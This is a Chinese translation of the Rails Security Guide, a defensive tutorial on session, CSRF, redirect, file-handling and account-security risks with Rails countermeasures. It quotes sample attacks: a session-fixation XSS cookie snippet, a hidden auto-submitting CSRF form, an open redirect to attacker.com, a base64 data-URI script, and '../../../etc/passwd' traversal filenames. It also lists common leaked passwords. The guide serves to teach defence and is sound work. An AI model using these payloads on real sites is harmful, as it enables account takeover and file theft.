Rails 安全指南
=============

本文介绍网页程序中常见的安全隐患，以及如何在 Rails 中防范。

读完本文后，你将学到：

* 所有推荐使用的安全对策；
* Rails 中会话的概念，应该在会话中保存什么内容，以及常见的攻击方式；
* 单单访问网站为什么也有安全隐患（跨站请求伪造）；
* 处理文件以及提供管理界面时应该注意哪些问题；
* 如果管理用户：登录、退出，以及各种攻击方式；
* 最常见的注入攻击方式；

--------------------------------------------------------------------------------

## 简介

网页程序框架的作用是帮助开发者构建网页程序。有些框架还能增强网页程序的安全性。其实框架之间无所谓谁更安全，只要使用得当，就能开发出安全的程序。Rails 提供了很多智能的帮助方法，例如避免 SQL 注入的方法，可以避免常见的安全隐患。我很欣慰，我所审查的 Rails 程序安全性都很高。

一般来说，安全措施不能随取随用。安全性取决于开发者怎么使用框架，有时也跟开发方式有关。而且，安全性受程序架构的影响：存储方式，服务器，以及框架本身等。

不过，根据加特纳咨询公司的研究，约有 75% 的攻击发生在网页程序层，“在 300 个审查的网站中，97% 有被攻击的可能”。网页程序相对而言更容易攻击，因为其工作方式易于理解，即使是外行人也能发起攻击。

网页程序面对的威胁包括：窃取账户，绕开访问限制，读取或修改敏感数据，显示欺诈内容。攻击者有可能还会安装木马程序或者来路不明的邮件发送程序，用于获取经济利益，或者修改公司资源，破坏企业形象。为了避免受到攻击，最大程度的降低被攻击后的影响，首先要完全理解各种攻击方式，这样才能有的放矢，找到最佳对策——这就是本文的目的。

为了能开发出安全的网页程序，你必须要了解所用组件的最新安全隐患，做到知己知彼。想了解最新的安全隐患，可以订阅安全相关的邮件列表，阅读关注安全的博客，养成更新和安全检查的习惯。详情参阅“[其他资源](#additional-resources)”一节。我自己也会动手检查，这样才能找到可能引起安全问题的代码。

## 会话

会话是比较好的切入点，有一些特定的攻击方式。

### 会话是什么

NOTE: HTTP 是无状态协议，会话让其变成有状态。

大多数程序都要记录用户的特定状态，例如购物车里的商品，或者当前登录用户的 ID。没有会话，每次请求都要识别甚至重新认证用户。Rails 会为访问网站的每个用户创建会话，如果同一个用户再次访问网站，Rails 会加载现有的会话。

会话一般会存储一个 Hash，以及会话 ID。ID 是由 32 个字符组成的字符串，用于识别 Hash。发送给浏览器的每个 cookie 中都包含会话 ID，而且浏览器发送到服务器的每个请求中也都包含会话 ID。在 Rails 程序中，可以使用 `session` 方法保存和读取会话：

{:lang="ruby"}
~~~
session[:user_id] = @current_user.id
User.find(session[:user_id])
~~~

### 会话 ID

NOTE: 会话 ID 是 32 位字节长的 MD5 哈希值。

会话 ID 是一个随机生成的哈希值。这个随机生成的字符串中包含当前时间，0 和 1 之间的随机数字，Ruby 解释器的进程 ID（随机生成的数字），以及一个常量。目前，还无法暴力破解 Rails 的会话 ID。虽然 MD5 很难破解，但却有可能发生同值碰撞。理论上有可能创建完全一样的哈希值。不过，这没什么安全隐患。

### 会话劫持

W> 窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网页程序。

很多网页程序都有身份认证系统，用户提供用户名和密码，网页程序验证提供的信息，然后把用户的 ID 存储到会话 Hash 中。此后，这个会话都是有效的。每次请求时，程序都会从会话中读取用户 ID，加载对应的用户，避免重新认证用户身份。cookie 中的会话 ID 用于识别会话。

因此，cookie 是网页程序身份认证系统的中转站。得到 cookie，就能以该用户的身份访问网站，这会导致严重的后果。下面介绍几种劫持会话的方法以及对策。

*   在不加密的网络中嗅听 cookie。无线局域网就是一种不安全的网络。在不加密的无线局域网中，监听网内客户端发起的请求极其容易。这是不建议在咖啡店工作的原因之一。对网页程序开发者来说，可以使用 SSL 建立安全连接避免嗅听。在 Rails 3.1 及以上版本中，可以在程序的设置文件中设置强制使用 SSL 连接：

    {:lang="ruby"}
    ~~~
    config.force_ssl = true
    ~~~

*   大多数用户在公用终端中完工后不清除 cookie。如果前一个用户没有退出网页程序，你就能以该用户的身份继续访问网站。网页程序中一定要提供“退出”按钮，而且要放在特别显眼的位置。

*   很多跨站脚本（cross-site scripting，简称 XSS）的目的就是窃取用户的 cookie。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。

*   有时攻击者不会窃取用户的 cookie，而为用户指定一个会话 ID。这叫做“会话固定攻击”，后文会详细介绍。

大多数攻击者的动机是获利。[赛门铁克全球互联网安全威胁报告](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，在地下市场，窃取银行账户的价格为 10-1000 美元（视账户余额而定），窃取信用卡卡号的价格为 0.40-20 美元，窃取在线拍卖网站账户的价格为 1-8 美元，窃取 Email 账户密码的价格为 4-30 美元。

### 会话安全指南

下面是一些常规的会话安全指南。

* **不在会话中存储大型对象。**大型对象要存储在数据库中，会话中只保存对象的 ID。这么做可以避免同步问题，也不会用完会话存储空间（空间大小取决于所使用的存储方式，详情见后文）。如果在会话中存储大型对象，修改对象结构后，旧版数据仍在用户的 cookie 中。在服务器端存储会话可以轻而易举地清除旧会话数据，但在客户端中存储会话就无能为力了。

* **敏感数据不能存储在会话中。**如果用户清除 cookie，或者关闭浏览器，数据就没了。在客户端中存储会话数据，用户还能读取敏感数据。

### 会话存储

NOTE: Rails 提供了多种存储会话的方式，其中最重要的一个是 `ActionDispatch::Session::CookieStore`。

Rails 2 引入了一个新的默认会话存储方式，`CookieStore`。`CookieStore` 直接把会话存储在客户端的 cookie 中。服务器无需会话 ID，可以直接从 cookie 中获取会话。这种存储方式能显著提升程序的速度，但却存在争议，因为有潜在的安全隐患：

* cookie 中存储的内容长度不能超过 4KB。这个限制没什么影响，因为前面说过，会话中不应该存储大型数据。**在会话中存储用户对象在数据库中的 ID 一般来说也是可接受的。**

* 客户端能看到会话中的所有数据，因为其中的内容都是明文（使用 Base64 编码，因此没有加密）。因此，**不能存储敏感信息**。为了避免篡改会话，Rails 会根据服务器端的密令生成摘要，添加到 cookie 的末尾。

因此，cookie 的安全性取决于这个密令（以及计算摘要的算法，为了兼容，默认使用 SHA1）。**密令不能随意取值，例如从字典中找个单词，长度也不能少于 30 个字符。**

`secrets.secret_key_base` 指定一个密令，程序的会话用其和已知的安全密令比对，避免会话被篡改。`secrets.secret_key_base` 是个随机字符串，保存在文件 `config/secrets.yml` 中：

{:lang="yaml"}
~~~
development:
  secret_key_base: a75d...

test:
  secret_key_base: 492f...

production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
~~~

Rails 以前版本中的 `CookieStore` 使用 `secret_token`，新版中的 `EncryptedCookieStore` 使用 `secret_key_base`。详细说明参见升级指南。

如果你的程序密令暴露了（例如，程序的源码公开了），强烈建议你更换密令。

### `CookieStore` 存储会话的重放攻击

T> 使用 `CookieStore` 存储会话时要注意一种叫做“重放攻击”（replay attack）的攻击方式。

重放攻击的工作方式如下：

* 用户收到一些点数，数量存储在会话中（不应该存储在会话中，这里只做演示之用）；
* 用户购买了商品；
* 剩余点数还在会话中；
* 用户心生歹念，复制了第一步中的 cookie，替换掉浏览器中现有的 cookie；
* 用户的点数又变成了消费前的数量；

在会话中写入一个随机值（nonce）可以避免重放攻击。这个随机值只能通过一次验证，服务器记录了所有合法的随机值。如果程序用到了多个服务器情况就变复杂了。把随机值存储在数据库中就违背了使用 `CookieStore` 的初衷（不访问数据库）。

避免重放攻击最有力的方式是，不在会话中存储这类数据，将其存到数据库中。针对上例，可以把点数存储在数据库中，把登入用户的 ID 存储在会话中。

### 会话固定攻击

NOTE: 攻击者可以不窃取用户的会话 ID，使用一个已知的会话 ID。这叫做“会话固定攻击”（session fixation）

![会话固定攻击]({{ site.baseurl }}/images/session_fixation.png)

会话固定攻击的关键是强制用户的浏览器使用攻击者已知的会话 ID。因此攻击者无需窃取会话 ID。攻击过程如下：

* 攻击者创建一个合法的会话 ID：打开网页程序的登录页面，从响应的 cookie 中获取会话 ID（如上图中的第 1 和第 2 步）。
* 程序有可能在维护会话，每隔一段时间，例如 20 分钟，就让会话过期，减少被攻击的可能性。因此，攻击者要不断访问网页程序，让会话保持可用。
* 攻击者强制用户的浏览器使用这个会话 ID（如上图中的第 3 步）。由于不能修改另一个域名中的 cookie（基于同源原则），攻击者就要想办法在目标网站的域中运行 JavaScript，通过跨站脚本把 JavaScript 注入目标网站。一个跨站脚本示例：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。跨站脚本及其注入方式参见后文。
* 攻击者诱引用户访问被 JavaScript 代码污染的网页。查看这个页面后，用户浏览器中的会话 ID 就被篡改成攻击者伪造的会话 ID。
* 因为伪造的会话 ID 还没用过，所以网页程序要认证用户的身份。
* 此后，用户和攻击者就可以共用同一个会话访问这个网站了。攻击者伪造的会话 ID 漂白了，而用户浑然不知。

### 会话固定攻击的对策

T> 只需一行代码就能避免会话固定攻击。

最有效的对策是，登录成功后重新设定一个新的会话 ID，原来的会话 ID 作废。这样，攻击者就无法使用固定的会话 ID 了。这个对策也能有效避免会话劫持。在 Rails 中重设会话的方式如下：

{:lang="ruby"}
~~~
reset_session
~~~

如果用了流行的 RestfulAuthentication 插件管理用户，要在 `SessionsController#create` 动作中调用 `reset_session` 方法。注意，这个方法会清除会话中的所有数据，**你要把用户转到新的会话中**。

另外一种对策是把用户相关的属性存储在会话中，每次请求都做验证，如果属性不匹配就禁止访问。用户相关的属性可以是 IP 地址或用户代理名（浏览器名），不过用户代理名和用户不太相关。存储 IP 地址时要注意，有些网络服务提供商或者大型组织把用户的真实 IP 隐藏在代理后面，对会话有比较大的影响，所以这些用户可能无法使用程序，或者使用受限。

### 会话过期

NOTE: 永不过期的会话增加了跨站请求伪造、会话劫持和会话固定攻击的可能性。

cookie 的过期时间可以通过会话 ID 设定。然而，客户端可以修改存储在浏览器中的 cookie，因此在服务器上把会话设为过期更安全。下面的例子把存储在数据库中的会话设为过期。`Session.sweep("20 minutes")` 把二十分钟前的会话设为过期。

{:lang="ruby"}
~~~
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end

    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
~~~

在“会话固定攻击”一节提到过维护会话的问题。虽然上述代码能把会话设为过期，但攻击者每隔五分钟访问一次网站就能让会话始终有效。对此，一个简单的解决办法是在会话数据表中添加 `created_at` 字段，删除很久以前创建的会话。在上面的代码中加入下面的代码即可：

{:lang="ruby"}
~~~
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
~~~

## 跨站请求伪造

跨站请求伪造（cross-site request forgery，简称 CSRF）攻击的方法是在页面中包含恶意代码或者链接，攻击者认为被攻击的用户有权访问另一个网站。如果用户在那个网站的会话没有过期，攻击者就能执行未经授权的操作。

![跨站请求伪造]({{ site.baseurl }}/images/csrf.png)

读过前一节我们知道，大多数 Rails 程序都使用 cookie 存储会话，可能只把会话 ID 存储在 cookie 中，而把会话内容存储在服务器上，或者把整个会话都存储在客户端。不管怎样，只要能找到针对某个域名的 cookie，请求时就会连同该域中的 cookie 一起发送。这就是问题所在，如果请求由域名不同的其他网站发起，也会一起发送 cookie。我们来看个例子。

* Bob 访问一个留言板，其中有篇由黑客发布的帖子，包含一个精心制造的 HTML 图片元素。这个元素指向 Bob 的项目管理程序中的某个操作，而不是真正的图片文件。
* 图片元素的代码为 `<img src="http://www.webapp.com/project/1/destroy">`。
* Bob 在 www.webapp.com 网站上的会话还有效，因为他并没有退出。
* 查看这篇帖子后，浏览器发现有个图片标签，尝试从 www.webapp.com 加载这个可疑的图片。如前所述，浏览器会同时发送 cookie，其中就包含可用的会话 ID。
* www.webapp.com 验证了会话中的用户信息，销毁 ID 为 1 的项目。请求得到的响应页面浏览器无法解析，因此不会显示图片。
* Bob 并未察觉到被攻击了，一段时间后才发现 ID 为 1 的项目不见了。

有一点要特别注意，精心制作的图片或链接无需出现在网页程序的同一域名中，任何地方都可以，论坛、博客，甚至是电子邮件。

CSRF 很少出现在 CVE（通用漏洞披露，Common Vulnerabilities and Exposures）中，2006 年比例还不到 0.1%，但却是个隐形杀手。这倒和我（以及其他人）的安全合约工作得到的结果完全相反——**CSRF 是个严重的安全问题**。

### CSRF 的对策

NOTE: 首先，遵守 W3C 的要求，适时地使用 GET 和 POST 请求。其次，在非 GET 请求中加入安全权标可以避免程序受到 CSRF 攻击。

HTTP 协议提供了两种主要的基本请求类型，GET 和 POST（当然还有其他请求类型，但大多数浏览器都不支持）。万维网联盟（World Wide Web Consortium，简称 W3C）提供了一个检查表用于选择 GET 和 POST：

**使用 GET 请求的情形：**

* 交互更像是在询问，例如查询，读取等安全的操作；

**使用 POST 请求的情形：**

* 交互更像是执行某项命令；
* 交互改变了资源的状态，且用户能察觉到这个变化，例如订阅一项服务；
* 交互的结果由用户负责；

如果你的网页程序使用 REST 架构，可能已经用过其他 HTTP 请求，例如 PATCH、PUT 和 DELETE。现今的大多数浏览器都不支持这些请求，只支持 GET 和 POST。Rails 使用隐藏的 `_method` 字段处理这一难题。

**POST 请求也能自动发送。**举个例子，下面这个链接虽在浏览器的状态栏中显示的目标地址是 www.harmless.com，但其实却动态地创建了一个表单，发起 POST 请求。

{:lang="html"}
~~~
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
~~~

攻击者还可以把代码放在图片的 `onmouseover` 事件句柄中：

{:lang="html"}
~~~
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
~~~

伪造请求还有其他方式，例如使用 `<script>` 标签向返回 JSONP 或 JavaScript 的地址发起跨站请求。响应是可执行的代码，攻击者能找到方法执行其中的代码，获取敏感数据。为了避免这种数据泄露，可以禁止使用跨站 `<script>` 标签，只允许使用 Ajax 请求获取 JavaScript 响应，因为 XmlHttpRequest 遵守同源原则，只有自己的网站才能发起请求。

为了防止其他伪造请求，我们可以使用安全权标，这个权标只有自己的网站知道，其他网站不知道。我们要在请求中加入这个权标，且要在服务器上做验证。这些操作只需在控制器中加入下面这行代码就能完成：

{:lang="ruby"}
~~~
protect_from_forgery
~~~

加入这行代码后，Rails 生成的所有表单和 Ajax 请求中都会包含安全权标。如果安全权标和预期的值不一样，程序会重置会话。

一般来说最好使用持久性 cookie 存储用户的信息，例如 `cookies.permanent`。此时，cookie 不会被清除，而且自动加入的 CSRF 保护措施也不会受到影响。如果此类信息没有使用会话存储在 cookie 中，就要自己动手处理：

{:lang="ruby"}
~~~
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end
~~~

上述代码可以放到 `ApplicationController` 中，如果非 GET 请求中没有 CSRF 权标就会调用这个方法。

注意，跨站脚本攻击会跳过所有 CSRF 保护措施。攻击者通过跨站脚本可以访问页面中的所有元素，因此能读取表单中的 CSRF 安全权标或者直接提交表单。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。

## 重定向和文件

有一种安全漏洞由网页程序中的重定向和文件引起。

### 重定向

W> 网页程序中的重定向是个被低估的破坏工具：攻击者可以把用户引到有陷阱的网站，或者制造独立攻击（self-contained attack）。

只要允许用户指定重定向地址，就有可能被攻击。最常见的攻击方式是把用户重定向到一个和正牌网站看起来一模一样虚假网站。这叫做“钓鱼攻击”。攻击者把不会被怀疑的链接通过邮件发给用户，在链接中注入跨站脚本，或者把链接放在其他网站中。用户之所以不怀疑，是因为链接以熟知的网站域名开头，转向恶意网站的地址隐藏在重定向参数中，例如 http://www.example.com/site/redirect?to= www.attacker.com。我们来看下面这个 `legacy` 动作：

{:lang="ruby"}
~~~
def legacy
  redirect_to(params.update(action:'main'))
end
~~~

如果用户访问 `legacy` 动作，会转向 `main` 动作。其作用是保护 URL 参数，将其转向 `main` 动作。但是，如果攻击者在 URL 中指定 `host` 参数仍能用来攻击：

~~~
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
~~~

如果 `host` 参数出现在地址的末尾，用户很难察觉，最终被重定向到 attacker.com。对此，一种简单的对策是只允许在 `legacy` 动作中使用指定的参数（使用白名单，而不是删除不该使用的参数）。如果重定向到一个地址，要通过白名单或正则表达式检查目标地址。

#### 独立跨站脚本攻击

还有一种重定向和独立跨站脚本攻击可通过在 Firefox 和 Opera 中使用 data 协议实现。data 协议直接把内容显示在浏览器中，可以包含任何 HTML 或 JavaScript，以及完整的图片：

~~~
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
~~~

这是个使用 Base64 编码的 JavaScript 代码，显示一个简单的弹出窗口。在重定向地址中，攻击者可以通过这段恶意代码把用户引向这个地址。对此，一个对策是禁止用户指定重定向的地址。

### 文件上传

NOTE: 确保上传的文件不会覆盖重要的文件，而且要异步处理文件上传过程。

很多网页程序都允许用户上传文件。程序应该过滤文件名，因为用户可以（部分）指定文件名，攻击者可以使用恶意的文件名覆盖服务器上的任意文件。如果上传的文件存储在 `/var/www/uploads` 文件夹中，用户可以把上传的文件命名为 `../../../etc/passwd`，这样就覆盖了重要文件。当然了，Ruby 解释器需要特定的授权才能这么做。这也是为什么要使用权限更少的用户运行网页服务器、数据库服务器等程序的原因。

过滤用户上传文件的文件名时，不要只删除恶意部分。设想这样一种情况，网页程序删除了文件名中的所有 `../`，但是攻击者可以使用 `....//`，得到的结果还是 `../`。最好使用白名单，确保文件名中只包含指定的字符。这和黑名单的做法不同，黑名单只是简单的把不允许使用的字符删掉。如果文件名不合法，拒绝使用即可（或者替换成允许使用的字符），不要删除不可用的字符。下面这个文件名清理方法摘自 [attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master) 插件。

{:lang="ruby"}
~~~
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
~~~

同步处理文件上传一个明显的缺点是，容易受到“拒绝服务”（denial-of-service，简称 DOS）攻击。攻击者可以同时在多台电脑上上传图片，增加服务器负载，最终有可能导致服务器宕机。

所以最好异步处理媒体文件的上传过程：保存媒体文件，然后在数据库中排期一个处理请求，让另一个进程在后台上传文件。

### 上传文件中的可执行代码

W> 如果把上传的文件存放在特定的文件夹中，其中的源码会被执行。如果 `/public` 文件夹是 Apache 的根目录，就不能把上传的文件保存在这个文件夹里。

使用广泛的 Apache 服务器有个选项叫做 `DocumentRoot`。这个选项指定网站的根目录，这个文件夹中的所有文件都会由服务器伺服。如果文件使用特定的扩展名（例如 PHP 和 CGI 文件），请求该文件时会执行其中包含的代码（可能还要设置其他选项）。假设攻击者上传了一个名为 `file.cgi` 的文件，用户下载这个文件时就会执行其中的代码。

如果 Apache 的 `DocumentRoot` 指向 Rails 的 `/public` 文件夹，请不要把上传的文件放在这个文件夹中， 至少要放在子文件夹中。

### 文件下载

NOTE: 确保用户不能随意下载文件。

就像过滤上传文件的文件名一样，下载文件时也要这么做。`send_file()` 方法可以把服务器上的文件发送到客户端，如果不过滤用户提供的文件名，可以下载任何一个文件：

{:lang="ruby"}
~~~
send_file('/var/www/uploads/' + params[:filename])
~~~

把文件名设为 `../../../etc/passwd` 就能下载服务器的登录信息。一个简单的对策是，检查请求的文件是否在指定的文件夹中：

{:lang="ruby"}
~~~
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
~~~

另外一种方法是把文件名保存在数据库中，然后用数据库中的 ID 命名存储在硬盘上的文件。这样也能有效避免执行上传文件中的代码。attachment_fu 插件使用的就是类似方式。

## 局域网和管理界面的安全

局域网和管理界面是常见的攻击目标，因为这些地方有访问特权。局域网和管理界面需要多种安全防护措施，但实际情况却不理想。

2007 年出现了第一个专门用于窃取局域网信息的木马，名为“Monster for employers”，攻击 Monster.com 这个在线招聘网站。迄今为止，特制的木马虽然很少出现，但却表明了客户端安全的重要性。不过，局域网和管理界面面对的最大威胁是 XSS 和 CSRF。

**XSS** 如果转发了来自外部网络的恶意内容，程序有可能受到 XSS 攻击。用户名、评论、垃圾信息过滤程序、订单地址等都是经常被 XSS 攻击的对象。

如果局域网或管理界面的输入没有过滤，整个程序都处在危险之中。可能的攻击包括：窃取有权限的管理员 cookie，注入 iframe 偷取管理员的密码，通过浏览器漏洞安装恶意软件控制管理员的电脑。

XSS 的对策参阅“[注入](#injection)”一节。在局域网和管理界面中也推荐使用 SafeErb 插件。

**CSRF** 跨站请求伪造（Cross-Site Request Forgery，简称 CSRF 或者 XSRF）是一种防不胜防的攻击方式，攻击者可以用其做管理员和局域网内用户能做的一切操作。CSRF 的工作方式前文已经介绍过，下面我们来看一下攻击者能在局域网或管理界面中做些什么。

一个真实地案例是[通过 CSRF 重新设置路由器](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352)。攻击者向墨西哥用户发送了一封包含 CSRF 的恶意电子邮件，声称有一封电子贺卡。邮件中还有一个图片标签，发起 HTTP GET 请求，重新设置用户的路由器。这个请求修改了 DNS 设置，如果用户访问墨西哥的银行网站，会被带到攻击者的网站。只要通过这个路由器访问银行网站，用户就会被引向攻击者的网站，导致密码被偷。

还有一个案例是修改 Google Adsense 账户的 Email 地址和密码。如果用户登录 Google Adsense，攻击者就能窃取密码。

另一种常见的攻击方式是在网站中发布垃圾信息，通过博客或论坛传播恶意的跨站脚本。当然了，攻击者要知道地址的结构，不过大多数 Rails 程序的地址结构一目了然。如果程序是开源的，也很容易找出地址的结构。攻击者甚至可以通过恶意的图片标签猜测，尝试各种可能的组合，幸运的话不会超过一千次。

在局域网和管理界面防范 CSRF 的方法参见“[CSRF 的对策](#csrf-countermeasures)”一节。

### 其他预防措施

管理界面一般都位于 www.example.com/admin，或许只有 `User` 模型的 `admin` 字段为 `true` 时才能访问。管理界面显示了用户的输入内容，管理员可根据需求删除、添加和编辑数据。我对管理界面的一些想法：

* 一定要考虑最坏的情况：如果有人得到了我的 cookie 或密码该怎么办。你可以为管理界面引入用户角色，限制攻击者的权限。也可为管理界面使用特殊的密码，和网站前台不一样。也许每个重要的动作都使用单独的特殊密码也是个不错的主意。

* 管理界面有必要能从世界各地访问吗？考虑一下限制能登陆的 IP 地址段。使用 `request.remote_ip` 可以获取用户的 IP 地址。这一招虽不能保证万无一失，但却是道有力屏障。使用时要注意代理的存在。

* 把管理界面放到单独的子域名中，例如 admin.application.com，使用独立的程序及用户管理系统。这样就不可能从 www.application.com 中窃取管理密码了，因为浏览器中有同源原则：注入 www.application.com 中的跨站脚本无法读取 admin.application.com 中的 cookie，反之亦然。

## 用户管理

NOTE: 几乎每个网页程序都要处理权限和认证。不要自己实现这些功能，推荐使用常用的插件，而且要及时更新。除此之外还有一些预防措施，可以让程序更安全。

Rails 身份认证插件很多，比较好的有 [devise](https://github.com/plataformatec/devise) 和 [authlogic](https://github.com/binarylogic/authlogic)。这些插件只存储加密后的密码，不会存储明文。从 Rails 3.1 起，可以使用内建的 `has_secure_password` 方法实现类似的功能。

注册后程序会生成一个激活码，用户会收到一封包含激活链接的邮件。激活账户后，数据库中的 `activation_code` 字段被设为 `NULL`。如果有人访问类似的地址，就能以在数据库中查到的第一个激活的用户身份登录程序，这个用户极有可能是管理员：

~~~
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
~~~

这么做之所以可行，是因为在某些服务器上，访问上述地址后，ID 参数（`params[:id]`）的值是 `nil`。查找激活码的方法如下：

{:lang="ruby"}
~~~
User.find_by_activation_code(params[:id])
~~~

如果 ID 为 `nil`，生成的 SQL 查询如下：

{:lang="sql"}
~~~
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
~~~

查询到的是数据库中的第一个用户，返回给动作并登入该用户。详细说明参见[我博客上的文章](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)。因此建议经常更新插件。而且，审查程序的代码也可以发现类似问题。

### 暴力破解账户

NOTE: 暴力破解需要不断尝试，根据错误提示做改进。提供模糊的错误消息、使用验证码可以避免暴力破解。

网页程序中显示的用户列表可被用来暴力破解用户的密码，因为大多数用户使用的密码都不复杂。大多数密码都是由字典单词和数字组成的。只要有一组用户名和字典，自动化程序就能在数分钟内找到正确的密码。

因此，大多数网页程序都会显示更模糊的错误消息，例如“用户名或密码错误”。如果提示“未找到您输入的用户名”，攻击者会自动生成用户名列表。

不过，被大多数开发者忽略的是忘记密码页面。这个页面经常会提示能否找到输入的用户名或邮件地址。攻击者据此可以生成用户名列表，用于暴力破解账户。

为了尽量避免这种攻击，忘记密码页面上显示的错误消息也要模糊一点。如果同一 IP 地址多次登录失败后，还可以要求输入验证码。注意，这种方法不能完全禁止自动化程序，因为自动化程序能频繁更换 IP 地址。不过也算增加了一道防线。

### 盗取账户

很多程序的账户很容易盗取，为什么不增加盗窃的难度呢？

#### 密码

攻击者一旦窃取了用户的会话 cookie 就能进入程序。如果能轻易修改密码，几次点击之后攻击者就能盗用账户。如果修改密码的表单有 CSRF 漏洞，攻击者可以把用户引诱到一个精心制作的网页，其中包含可发起跨站请求伪造的图片。针对这种攻击的对策是，在修改密码的表单中加入 CSRF 防护，而且修改密码前要输入原密码。

#### E-Mail

攻击者还可通过修改 Email 地址盗取账户。修改 Email 地址后，攻击者到忘记密码页面输入邮箱地址，新密码就会发送到攻击者提供的邮箱中。针对这种攻击的对策是，修改 Email 地址时要输入密码。

#### 其他

不同的程序盗取账户的方式也不同。大多数情况下都要利用 CSRF 和 XSS。例如 [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) 中的 CSRF 漏洞。在这个概念性的攻击中，用户被引向攻击者控制的网站。网站中包含一个精心制作的图片，发起 HTTP GET 请求，修改 Google Mail 的过滤器设置。如果用户登入 Google Mail，攻击者就能修改过滤器，把所有邮件都转发到自己的邮箱中。这几乎和账户被盗的危险性相同。针对这种攻击的对策是，审查程序的逻辑，封堵所有 XSS 和 CSRF 漏洞。

### 验证码

NOTE: 验证码是质询-响应测试，用于判断响应是否由计算机生成。经常用在评论表单中，要求用户输入图片中扭曲的文字，禁止垃圾评论机器人发布评论。验证的目的不是为了证明用户是人类，而是为了证明机器人是机器人。

我们要防护的不仅是垃圾评论机器人，还有自动登录机器人。使用广泛的 [reCAPTCHA](http://recaptcha.net/) 会显示两个扭曲的图片，其中的文字摘自古籍，图片中还会显示一条直角线。早期的验证码使用扭曲的背景和高度变形的文字，但这种方式已经被破解了。reCAPTCHA 的这种做法还有个附加好处，可以数字化古籍。[ReCAPTCHA](https://github.com/ambethia/recaptcha/) 是个 Rails 插件，和所用 API 同名。

你会从 reCAPTCHA 获取两个密钥，一个公匙，一个私匙，这两个密钥要放到 Rails 程序的设置中。然后就可以在视图中使用 `recaptcha_tags` 方法，在控制器中使用 `verify_recaptcha` 方法。如果验证失败，`verify_recaptcha` 方法返回 `false`。验证码的问题是很烦人。而且，有些视觉受损的用户发现某些扭曲的验证码很难看清。

大多数机器人都很笨拙，会填写爬取页面表单中的每个字段。验证码正式利用这一点，在表单中加入一个诱引字段，通过 CSS 或 JavaScript 对用户隐藏。

通过 JavaScript 和 CSS 隐藏诱引字段可以使用下面的方法：

* 把字段移到页面的可视范围之外；
* 把元素的大小设的很小，或者把颜色设的和背景色一样；
* 显示这个字段，但告诉用户不要填写；

最简单的方法是使用隐藏的诱引字段。在服务器端要检查这个字段的值：如果包含任何文本，就说明这是个机器人。然后可以忽略这次请求，或者返回真实地结果，但不能把数据存入数据库。这样一来，机器人就以为完成了任务，继续前往下一站。对付讨厌的人也可以用这种方法。

Ned Batchelder 的[博客](http://nedbatchelder.com/text/stopbots.html)中介绍了更复杂的验证码。

注意，验证码只能防范自动机器人，不能阻止特别制作的机器人。所以，验证码或许不是登录表单的最佳防护措施。

### 日志

W> 告诉 Rails 不要把密码写入日志。

默认情况下，Rails 会把请求的所有信息写入日志。日志文件是个严重的安全隐患，因为其中可能包含登录密码和信用卡卡号等。考虑程序的安全性时，要想到攻击者获得服务器控制权这一情况。如果把明文密码写入日志，数据库再怎么加密也无济于事。在程序的设置文件中可以通过 `config.filter_parameters` 过滤指定的请求参数，不写入日志。过滤掉的参数在日志中会使用 `[FILTERED]` 代替。

{:lang="ruby"}
~~~
config.filter_parameters << :password
~~~

### 好密码

NOTE: 你是否发现很难记住所有密码？不要把密码记下来，使用容易记住的句子中单词的首字母。

安全专家 Bruce Schneier 研究了钓鱼攻击（[如下](#examples-from-the-underground)所示）获取的 34000 个真实的 MySpace 用户名和密码，发现大多数密码都很容易破解。最常用的 20 个密码是：

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, monkey

这些密码只有不到 4% 使用了字典中能找到的单词，而且大都由字母和数字组成。破解密码的字典中包含大多数常用的密码，攻击者会尝试所有可能的组合。如果攻击者知道你的用户名，而且密码很弱，你的账户就很容易被破解。

好的密码是一组很长的字符串，混合字母和数字。这种密码很难记住，建议你使用容易记住的长句的首字母。例如，从“The quick brown fox jumps over the lazy dog”中得到的密码是“Tqbfjotld”。注意，我只是举个例子，请不要使用熟知的名言，因为破解字典中可能有这些名言。

### 正则表达式

NOTE: 使用 Ruby 正则表达式时经常犯的错误是使用 `^` 和 `$` 分别匹配字符串的开头和结尾，其实应该使用 `\A` 和 `\z`。

